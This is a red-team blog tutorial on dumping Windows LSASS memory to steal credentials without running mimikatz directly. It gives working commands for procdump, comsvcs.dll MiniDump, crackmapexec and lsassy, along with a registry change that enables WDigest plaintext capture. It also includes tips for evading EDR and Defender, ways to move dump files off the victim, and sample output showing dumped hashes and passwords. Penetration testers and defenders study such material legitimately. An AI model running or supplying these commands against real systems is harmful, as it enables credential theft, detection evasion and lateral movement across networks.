---
title: Dumping LSASS Without Mimikatz
categories: [red team,credential dumping]
tags: [red-team,lsass,mimikatz,procdump,Comsvcs,crackmapexec,LSASSY,wdigest,]
comments: true
---

Mimikatz is a tool for dumping credentials from memory in Windows. It is a great tool for lateral and vertical privilege escalation in Windows Active Directory environments. Due to its popularity, the Mimikatz executable and PowerShell script are detected by most of the Antivirus (AV) solutions out there. In this article, I will talk about using several alternative methods to achieve the same goal without the need to modify the Mimikatz.

# What is LSASS?

The Local Security Authority Subsystem Service (LSASS) is the service in Microsoft Windows that manages all user authentication, password changes, generation of access tokens, and enforcement of security policies. For example, when you log on to a Windows user account or server, lsass.exe verifies the login name and password.

![Untitled](/assets/img/pitcures/red-team/dumplsass.png)

# Requirements to Get DUMP from LSASS

It is necessary to have `SeDebugPrivilege` privilege to dump LSASS as an attacker. The default Windows setting is to give this privilege to local administrators. You can check the rights with the command below.

```bash
whoami /priv
```

![Untitled](/assets/img/pitcures/red-team/dumplsass1.png)

# LSASS Dump Getting Methods

## Method 1- Getting LSASS Dump with Task Manager (GUI)

If you have Remote Desktop Protocol (RDP) session or other GUI access to the device, you can use the Windows Task Manager to create a dump file. By default, Windows Defender does not warn about threats.

From the Task Manager go to the `Details` tab, find `lsass.exe`, right click and select `Create dump file`.

This will create a dump file in the user's `C:\Users\0xhav0c\AppData\Local\Temp` directory:

![Untitled](/assets/img/pitcures/red-team/dumplsass2.png)

## Method 2- Getting LSASS Dump with PROCDUMP

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a Windows SysInternals tool that can be used to create memory dumps of processes. The disadvantage of this method is that you have to copy the Procdump executable to the target machine, and some organizations warn the binary as malicious.

To create a LSASS memory dump:

```bash
PS C:\Users\0xhav0c> procdump.exe -accepteula -ma lsass.exe out.dmp
```

Some EDR solutions warn or block this based on the `lsass` process name. This can usually be bypassed by specifying the LSASS transaction ID instead.

To get the LSASS process ID via PowerShell:

```bash
PS C:\Users\0xhav0c> get-process lsass
 
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1296      26     7148      51752               580   0 lsass
```

To get the LSASS process ID with CMD:

```bash
C:\Users\0xhav0c> tasklist | findstr lsass
lsass.exe                      580 Services                   0     51,752 K
```

Then dump the findstr value with the same procdump:

```bash
C:\Users\0xhav0c> procdump.exe -accepteula -ma 580 out.dmp
```

Additionally, depending on the EDR, you can simply add quotes around the transaction name

```bash
PS C:\Users\0xhav0c> procdump.exe -accepteula -ma “lsass.exe” out.dmp
```

## Method 3- Getting LSASS Dump with Comsvcs

With Comsvcs you can create a memory dump using native libraries available on Windows machines.

```bash
# Detect the PID for lsass.exe
PS C:\Users\0xhav0c> tasklist | findstr lsass
lsass.exe                      580 Services                   0     51,752 K
# Dumping LSASS.exe
PS C:\Users\0xhav0c> C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 580 C:\temp\out.dmp full
```

## Method 4- Getting LSASS Dump with Crackmapexec

Crackmapexec is an excellent tool for performing a LSASS dump remotely. With credentials with local admin access, you can to indicate an entire subnet or list of IP addresses and get.

```bash
crackmapexec smb 192.168.x.x -u 0xhav0c -p Password123! --lsa
SMB         192.168.x.x    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:secybr.com) (signing:True) (SMBv1:True)
SMB         192.168.x.x    445    DC               [+] secybr.com\0xhav0c:Password123! (Pwn3d!)
SMB         192.168.x.x    445    DC               [+] Dumping LSA secrets
SMB         192.168.x.x    445    DC               secybr.com\DC$:aes256-cts-hmac-sha1-96:5a0f8706487aae9bf38161a4608e7567ac1c4a105226b783ccbd98274c8d4018
SMB         192.168.x.x    445    DC               secybr.com\DC$:aes128-cts-hmac-sha1-96:d8402dda8272520b01ba6b8dcfd9b3d8
SMB         192.168.x.x    445    DC               secybr.com\DC$:des-cbc-md5:f45b2361ae1ad308
SMB         192.168.x.x    445    DC               secybr.com\DC$:plain_password_hex:4e4545a05fe307150e0679cf4169caea359467422908fec7e82b6eb63d23dfa9cb180c4c3da62ff7ce1ab1396b1fa505300bed8d7a67e36b74ab9b25721756181c47850cf9dc220964ae7c50a104cfed776f5c1cb8865bb443d9d757cd90dc1dca063ba89776825f20d7d61b7debfb5339cd69dc3c3c81b0e81c6b74065d4456a6339991fd05a5e687cd8fd0f81562a3613f7094015ab82ca0e16fca01551fdef5f397f48664cb64801215b453d29c1034aca75242c3be6aa080dd6be94ca91f712db8c6d4ca6305ee47912fa5a11bc388388fde380c3d9a712d6c8fe36b50c3cdedc4cae98d75eb9561c0a8ec13a0da
SMB         192.168.x.x    445    DC               secybr.com\DC$:aad3b435b51404eeaad3b435b51404ee:6e93dbc1944a24129c85324692f4687b:::
SMB         192.168.x.x    445    DC               [+] Dumped 7 LSA secrets to /home/t/.cme/logs/DC_192.168.x.x_2022-06-30_134314.secrets and /home/t/.cme/logs/DC_192.168.x.x_2022-06-30_134314.cached
```

> If Crackmapexec catches hashes and plaintext passwords, it will keep it in its home directory under `~/.cme/logs/`.
{: .prompt-tip }


CrackMapExec uses Impacket's [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump LSASS.

## Method 5- Getting LSASS Dump with LSASSY

[Lsassy](https://github.com/Hackndo/lsassy) is a tool that uses a combination of the above methods to offload LSASS remotely. The default command attempts to use the `comsvcs.dll` method to offload LSASS with WMI or a remote scheduled task:

```bash
└─$ lsassy -d secybr.com -u 0xhav0c -p Password123! 192.168.x.x
[+] [192.168.x.x] secybr.com\0xhav0c  58a478135a93ac3bf058a5ea0e8fdb71[+] [192.168.x.x] secybr.com\0xhav0c  Password123!
```

Additionally, Lsassy is integrated into Crackmapexec, giving you a nice clean output of just NTLM hashes or plain text credentials. 

> The disadvantage of this method over the `–lsa` method is that it does not automatically store the results in the Crackmapexec logs directory.
{: .prompt-info }

```bash
└─$ crackmapexec smb 192.168.x.x -u 0xhav0c -p 'Password123!' -M lsassy
SMB         192.168.x.x    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:secybr.com) (signing:True) (SMBv1:True)
SMB         192.168.x.x    445    DC               [+] secybr.com\0xhav0c:Password123! (Pwn3d!)
LSASSY      192.168.x.x    445    DC               secybr.com\0xhav0c 58a478135a93ac3bf058a5ea0e8fdb71
LSASSY      192.168.x.x    445    DC               secybr.com\0xhav0c Password123!
```

The methods shown up to this section were for devices that hold hashes and plaintext credentials.

## Enabling Wdigest and Obtaining Plain Text Credentials

WDigest is disabled on newer machines. It is possible for attackers to enable this plaintext credentials when a user logs in. WDigest can be enabled by setting the required registry key to "1" instead of "0":

```bash
C:\Users\0xhav0c> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1
```

Additionally, this can be done remotely with Crackmapexec:

```bash
└─$ crackmapexec smb 192.168.x.x -u 0xhav0c -p 'Password123!' -M wdigest -o action=enable
SMB         192.168.x.x    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:secybr.com) (signing:True) (SMBv1:True)
SMB         192.168.x.x    445    DC               [+] secybr.com\0xhav0c:Password123! (Pwn3d!)
WDIGEST     192.168.x.x    445    DC               [+] UseLogonCredential registry key created successfully
```

# Moving Dump Files to Attacker Device

Once you have the dump file, you can transfer it to the device where you can use mimikatz in many ways.

- You can copy paste with RDP.
- You can mount your disk to that device before sending the RDP connection.
- You can create a simple PHP page, configure it to accept file uploads to this address, and transfer the file to yourself with a POST request with Powershell on the victim device.
- If the victim has python on the device, you can create a simple web page by using the `http-server` module.
- Or you can upload it to an upload site that comes to mind first and get it from there.

# Examining Dump Files

## Method 1 - Examining Dump Files Using pypkatz

```bash
└─$ pypykatz lsa minidump lsass.DMP
```

## Method 2 - Examining Dump Files using mimikatz.exe

After obtaining the dump file, download Mimikaz on a windows device that belongs to you.

> Make sure to create an exception folder for Windows Defender on the machine where you are using Mimikatz, otherwise Defender Mimikatz will quarantine your executable. Run Mimikatz.
{: .prompt-warning }

 Use the following commands to extract the credentials from your LSASS Dump file:

```bash
sekurlsa::minidump lsass.DMP
sekurlsa::logonPasswords
```